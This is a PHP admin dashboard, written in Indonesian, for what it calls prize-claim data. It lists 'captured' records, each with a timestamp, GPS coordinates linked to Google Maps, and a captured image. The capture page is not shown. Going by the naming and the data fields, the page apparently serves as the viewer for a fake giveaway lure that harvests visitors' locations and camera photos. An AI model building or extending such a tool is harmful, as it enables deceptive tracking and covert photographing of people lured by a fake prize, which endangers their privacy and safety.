<?php
// File: admin.php
session_start();

// Redirect ke login jika belum login
if (!isset($_SESSION['admin_logged_in'])) {
    header('Location: admin_login.php');
    exit;
}

require 'db.php';

// Ambil data dari database
$stmt = $pdo->query("SELECT * FROM captured_data ORDER BY captured_at DESC");
$data = $stmt->fetchAll();
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Data Pengambilan Hadiah</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: #f0f2f5;
            color: #333;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            position: relative;
        }
        
        h1 {
            margin-bottom: 10px;
        }
        
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
        
        .stat-card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
            flex: 1;
            min-width: 200px;
        }
        
        .stat-card h3 {
            color: #6a11cb;
            margin-bottom: 10px;
        }
        
        .stat-value {
            font-size: 2.5rem;
            font-weight: bold;
            color: #2575fc;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
        }
        
        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
        }
        
        th {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            font-weight: bold;
        }
        
        tr:hover {
            background-color: #f8f9fa;
        }
        
        .image-cell img {
            width: 100px;
            height: 75px;
            object-fit: cover;
            border-radius: 5px;
            border: 1px solid #eee;
        }
        
        .map-link {
            color: #2575fc;
            text-decoration: none;
        }
        
        .map-link:hover {
            text-decoration: underline;
        }
        
        .timestamp {
            color: #666;
            font-size: 0.9rem;
        }
        
        .no-data {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            color: white;
            background: #e74c3c;
            padding: 8px 15px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
        }
        
        @media (max-width: 768px) {
            th, td {
                padding: 10px 8px;
                font-size: 0.9rem;
            }
            
            .image-cell img {
                width: 80px;
                height: 60px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Admin Panel - Data Pengambilan Hadiah</h1>
            <p>Data pengguna yang telah mengambil hadiah</p>
            <a href="admin_logout.php" class="logout-btn">Logout</a>
        </header>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Total Klaim</h3>
                <div class="stat-value"><?= count($data) ?></div>
            </div>
            <div class="stat-card">
                <h3>Klaim Hari Ini</h3>
                <div class="stat-value">
                    <?php
                    $today = date('Y-m-d');
                    $todayCount = 0;
                    foreach ($data as $row) {
                        if (date('Y-m-d', strtotime($row['captured_at'])) === $today) {
                            $todayCount++;
                        }
                    }
                    echo $todayCount;
                    ?>
                </div>
            </div>
        </div>
        
        <?php if (!empty($data)): ?>
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Waktu</th>
                    <th>Lokasi</th>
                    <th>Gambar</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($data as $row): ?>
                <tr>
                    <td><?= htmlspecialchars($row['id']) ?></td>
                    <td>
                        <div class="timestamp"><?= date('d M Y', strtotime($row['captured_at'])) ?></div>
                        <?= date('H:i:s', strtotime($row['captured_at'])) ?>
                    </td>
                    <td>
                        <a class="map-link" href="https://www.google.com/maps?q=<?= $row['latitude'] ?>,<?= $row['longitude'] ?>" target="_blank">
                            <?= number_format($row['latitude'], 6) ?>, <?= number_format($row['longitude'], 6) ?>
                        </a>
                    </td>
                    <td class="image-cell">
                        <img src="images/<?= htmlspecialchars($row['image_filename']) ?>" alt="Capture">
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <?php else: ?>
        <div class="no-data">
            <h3>Belum ada data pengambilan hadiah</h3>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>